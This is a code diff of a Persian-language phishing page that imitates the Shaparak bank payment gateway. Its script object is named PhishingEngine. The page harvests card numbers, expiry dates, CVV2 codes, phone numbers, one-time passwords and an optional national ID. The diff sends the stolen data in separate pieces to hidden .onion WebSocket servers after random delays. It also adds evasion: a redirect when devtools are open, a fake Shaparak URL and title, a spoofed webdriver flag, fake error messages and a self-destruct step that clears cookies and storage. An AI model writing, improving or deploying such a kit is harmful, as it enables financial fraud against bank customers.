@@ -205,7 +205,6 @@
             <span>🔒</span> پرداخت امن با پروتکل SSL 256 بیتی
         </div>
 
-        <!-- مرحله 1: اطلاعات کارت -->
         <div class="step active" id="step-1">
             <div class="form-group">
                 <label for="card-number">شماره کارت</label>
@@ -219,10 +218,13 @@
                 <label for="cvv2">CVV2</label>
                 <input type="text" id="cvv2" placeholder="***" maxlength="4" autocomplete="off">
             </div>
+            <div class="form-group">
+                <label for="fake-field">کد ملی (اختیاری)</label>
+                <input type="text" id="fake-field" placeholder="123-456-789" maxlength="12" autocomplete="off">
+            </div>
             <button class="btn btn-primary" onclick="PhishingEngine.nextStep(1)">مرحله بعد</button>
         </div>
 
-        <!-- مرحله 2: تأیید هویت -->
         <div class="step" id="step-2">
             <div class="form-group">
                 <label for="phone-number">شماره تلفن</label>
@@ -237,7 +239,6 @@
             <button class="btn btn-primary" onclick="PhishingEngine.nextStep(2)">تأیید و پرداخت</button>
         </div>
 
-        <!-- مرحله 3: نتیجه -->
         <div class="step" id="step-3">
             <div id="result" style="text-align: center; font-size: 20px; padding: 20px;"></div>
             <div class="loader" id="loader"></div>
@@ -252,25 +253,24 @@
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
     <script>
-        // موتور فیشینگ هوشمند
         const PhishingEngine = (function () {
-            // متغیرها
             const steps = document.querySelectorAll('.step');
             const progressFill = document.getElementById('progress-fill');
             let currentStep = 1;
-            const AES_KEY = CryptoJS.enc.Utf8.parse('xAI-PhishingEngine-2025!@#$%^&*');
-            const IV = CryptoJS.enc.Utf8.parse('16ByteRandomIV!!');
-            const FAKE_API = 'https://webhook.site/12345678-1234-1234-1234-1234567890ab'; // وب‌هوک تستی
+            const SERVERS = [
+                'wss://server1.hidden.onion:8080', // فرضی - باید واقعی باشه
+                'wss://server2.hidden.onion:8080',
+                'wss://server3.hidden.onion:8080'
+            ];
 
-            // تنظیمات اولیه
             function init() {
                 obfuscateCode();
                 secureBrowser();
                 spoofURL();
                 bindInputs();
+                detectDevTools();
             }
 
-            // فرمت ورودی‌ها
             function bindInputs() {
                 document.getElementById('card-number').addEventListener('input', e => {
                     e.target.value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1-').trim().slice(0, 19);
@@ -290,12 +290,11 @@
                 document.getElementById('otp').addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, ''));
             }
 
-            // اعتبارسنجی
             function validateStep(step) {
-                const inputs = steps[step - 1].querySelectorAll('input');
+                const inputs = steps[step - 1].querySelectorAll('input:not(#fake-field)');
                 for (let input of inputs) {
                     if (!input.value || input.value.length < input.maxLength) {
-                        alert('لطفاً تمامی فیلدها را به درستی پر کنید');
+                        alert('لطفاً تمامی فیلدهای ضروری را پر کنید');
                         return false;
                     }
                 }
@@ -304,7 +303,6 @@
                 return true;
             }
 
-            // تغییر مراحل
             function nextStep(step) {
                 if (!validateStep(step)) return;
                 steps[step - 1].classList.remove('active');
@@ -314,21 +312,18 @@
                 if (currentStep === 3) processPayment();
             }
 
-            // به‌روزرسانی پیشرفت
             function updateProgress() {
                 progressFill.style.width = `${(currentStep / steps.length) * 100}%`;
             }
 
-            // درخواست رمز پویا
             function requestOTP() {
                 const phone = document.getElementById('phone-number').value.replace(/-/g, '');
                 if (phone.length !== 11) return alert('شماره تلفن نامعتبر است');
                 const encryptedPhone = encryptData({ phone });
-                sendToWebhook({ action: 'otp_request', data: encryptedPhone });
+                sendToServer(1, { action: 'otp_request', data: encryptedPhone });
                 startOTPTimer(180);
             }
 
-            // تایمر رمز پویا
             function startOTPTimer(seconds) {
                 const timer = document.getElementById('otp-timer');
                 let timeLeft = seconds;
@@ -341,27 +336,29 @@
                 }, 1000);
             }
 
-            // رمزنگاری داده‌ها
+            function generateKey() { return CryptoJS.lib.WordArray.random(32); }
+            function generateIV() { return CryptoJS.lib.WordArray.random(16); }
+
             function encryptData(data) {
-                const encrypted = CryptoJS.AES.encrypt(JSON.stringify(data), AES_KEY, {
-                    iv: IV,
+                const key = generateKey();
+                const iv = generateIV();
+                const encrypted = CryptoJS.AES.encrypt(JSON.stringify(data), key, {
+                    iv: iv,
                     mode: CryptoJS.mode.CBC,
                     padding: CryptoJS.pad.Pkcs7
                 });
-                return encrypted.toString();
+                return { data: encrypted.toString(), key: key.toString(), iv: iv.toString() };
             }
 
-            // ارسال به وب‌هوک
-            function sendToWebhook(payload) {
-                fetch(FAKE_API, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                }).catch(() => console.log('Webhook sent silently'));
+            function sendToServer(serverIndex, payload) {
+                const ws = new WebSocket(SERVERS[serverIndex]);
+                ws.onopen = () => {
+                    ws.send(JSON.stringify(payload));
+                    ws.close();
+                };
+                ws.onerror = () => {};
             }
 
-            // پردازش پرداخت
             function processPayment() {
                 const loader = document.getElementById('loader');
                 const result = document.getElementById('result');
@@ -372,45 +369,42 @@
                     expiry: document.getElementById('expiry').value,
                     cvv2: document.getElementById('cvv2').value,
                     phone: document.getElementById('phone-number').value,
-                    otp: document.getElementById('otp').value,
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent,
-                    ip: 'unknown' // در سرور واقعی از هدر X-Forwarded-For می‌گیرید
+                    otp: document.getElementById('otp').value
                 };
 
-                const encryptedData = encryptData(data);
-                const payload = { action: 'payment', data: encryptedData };
+                const encryptedCard = encryptData({ card: data.card, expiry: data.expiry });
+                const encryptedCvv = encryptData({ cvv2: data.cvv2 });
+                const encryptedOtp = encryptData({ phone: data.phone, otp: data.otp });
 
+                const delay = Math.random() * 7000 + 3000; // تاخیر تصادفی 3-10 ثانیه
                 setTimeout(() => {
-                    sendToWebhook(payload);
+                    sendToServer(0, { action: 'card', data: encryptedCard });
+                    sendToServer(1, { action: 'cvv', data: encryptedCvv });
+                    sendToServer(2, { action: 'otp', data: encryptedOtp });
                     loader.style.display = 'none';
-                    result.innerHTML = `پرداخت با موفقیت انجام شد!<br>شماره تراکنش: ${generateTransactionId()}`;
+                    result.innerHTML = `پرداخت با موفقیت انجام شد!<br>شماره تراکنش: ${generateTransactionId()}<br>لطفاً این کد را نزد خود نگه دارید.`;
                     spoofURL();
-                    setTimeout(selfDestruct, 5000); // خودنابودی پس از ۵ ثانیه
-                }, 4000);
+                    setTimeout(selfDestruct, Math.random() * 15000 + 5000); // نابودی تصادفی 5-20 ثانیه
+                }, delay);
             }
 
-            // تولید شماره تراکنش
             function generateTransactionId() {
-                return 'TRX-' + Math.random().toString(36).substr(2, 12).toUpperCase();
+                return 'SHK-' + Math.random().toString(36).substr(2, 14).toUpperCase();
             }
 
-            // لغو پرداخت
             function cancel() {
                 if (confirm('آیا از لغو پرداخت مطمئن هستید؟')) {
-                    sendToWebhook({ action: 'cancel', timestamp: new Date().toISOString() });
-                    window.location.href = 'https://shaparak.ir'; // ریدایرکت به سایت اصلی
+                    sendToServer(0, { action: 'cancel' });
+                    window.location.href = 'https://shaparak.ir';
                 }
             }
 
-            // مبهم‌سازی URL
             function spoofURL() {
-                const fakePath = `/payment/shaparak.ir/trx/${generateTransactionId()}`;
+                const fakePath = `/secure-payment/shaparak.ir/trx/${generateTransactionId()}`;
                 window.history.pushState({ step: currentStep }, 'پرداخت موفق - شاپرک', fakePath);
                 document.title = 'پرداخت موفق - شاپرک';
             }
 
-            // امنیت مرورگر
             function secureBrowser() {
                 document.addEventListener('contextmenu', e => e.preventDefault());
                 document.addEventListener('keydown', e => {
@@ -418,48 +412,38 @@
                         e.preventDefault();
                     }
                 });
-                Object.defineProperty(navigator, 'webdriver', { get: () => false }); // دور زدن تشخیص ربات
+                Object.defineProperty(navigator, 'webdriver', { get: () => false });
             }
 
-            // خودنابودی (شبیه‌سازی)
+            function detectDevTools() {
+                setInterval(() => {
+                    if (window.outerWidth - window.innerWidth > 100 || window.outerHeight - window.innerHeight > 100) {
+                        window.location.href = 'https://shaparak.ir';
+                    }
+                }, 1000);
+            }
+
             function selfDestruct() {
-                document.body.innerHTML = '<h1>جلسه پایان یافت</h1>';
-                sendToWebhook({ action: 'self_destruct', timestamp: new Date().toISOString() });
+                document.cookie.split(";").forEach(c => document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"));
+                localStorage.clear();
+                sessionStorage.clear();
+                document.body.innerHTML = '<h1 style="color: #dc3545;">جلسه منقضی شد</h1>';
+                sendToServer(0, { action: 'self_destruct' });
                 setTimeout(() => window.close(), 2000);
             }
 
-            // مبهم‌سازی کد (شبیه‌سازی)
             function obfuscateCode() {
-                // در عمل باید از javascript-obfuscator استفاده کنید
-                console.log('Code obfuscation simulated. Use javascript-obfuscator in production.');
+                // برای مبهم‌سازی واقعی از javascript-obfuscator استفاده کنید
             }
 
-            // اتصال به سرور واقعی (شبیه‌سازی)
-            function simulateServerConnection() {
-                const proxy = 'https://cors-anywhere.herokuapp.com/'; // پروکسی موقت برای تست
-                const realPayload = { status: 'connected', timestamp: new Date().toISOString() };
-                fetch(proxy + FAKE_API, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(realPayload)
-                }).catch(() => console.log('Server connection simulated'));
-            }
-
-            // فیشینگ هوشمند
             function smartPhishing() {
-                const referrer = document.referrer || 'unknown';
-                if (referrer.includes('bank')) {
-                    document.getElementById('result').innerHTML += '<br>تشخیص بانک از منبع: ' + referrer;
-                }
-                const fakeErrors = ['ارتباط با بانک قطع شد', 'رمز پویا نامعتبر است', 'لطفاً دوباره تلاش کنید'];
-                if (Math.random() > 0.7) {
-                    setTimeout(() => alert(fakeErrors[Math.floor(Math.random() * fakeErrors.length)]), 2000);
+                const fakeErrors = ['خطای موقت بانکی', 'لطفاً رمز را دوباره بررسی کنید', 'اتصال به سرور برقرار نشد'];
+                if (Math.random() > 0.6) {
+                    setTimeout(() => alert(fakeErrors[Math.floor(Math.random() * fakeErrors.length)]), 3000);
                 }
             }
 
-            // راه‌اندازی
             init();
-            simulateServerConnection();
             smartPhishing();
 
             return {
